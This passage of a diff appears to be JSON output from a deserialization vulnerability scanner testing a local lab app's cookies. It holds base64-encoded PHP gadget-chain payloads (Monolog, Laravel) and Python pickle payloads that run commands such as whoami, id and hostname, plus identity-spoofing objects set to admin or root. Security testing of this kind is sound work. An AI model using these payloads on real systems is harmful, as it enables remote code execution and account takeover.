+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 92,
+            "body_sample": "{\"admin\":false,\"email\":\"wiener@acme-portal.test\",\"joined\":\"2025-01-15\",\"username\":\"wiener\"}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/logout",
+      "method": "POST",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/api/logout",
+      "method": "POST",
+      "location": "cookie",
+      "name": "session",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "Python Pickle",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Python Pickle RCE",
+      "suggested_probe": "pickle_exec",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "pickle.loads() from untrusted source = RCE by design | No gadget chain needed — __reduce__ enables arbitrary code execution | No explicit RCE pattern in payload text | Binary pickle opcodes may still contain RCE — inspect with pickletools",
+      "normalized": [
+        "\u0004:\u0000\u0000\u0000\u0000\u0000\u0000\u0000\b__main__\u0004User)}(\busername\u0006wiener\u0005adminub."
+      ],
+      "mutations_count": 3,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVHQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAJpZJSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        },
+        {
+          "payload_type": "pickle_rce",
+          "chain": "os.system via __reduce__",
+          "payload": "gAWVIwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAhob3N0bmFtZZSFlFKULg==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          },
+          "mutated": {
+            "status": 200,
+            "length": 17,
+            "body_sample": "{\"success\":true}\n"
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/login.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8083/profile.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": null,
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 12,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "signal": "weak",
+          "indicators": [],
+          "baseline": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          },
+          "mutated": {
+            "status": 304,
+            "length": 0,
+            "body_sample": ""
+          }
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
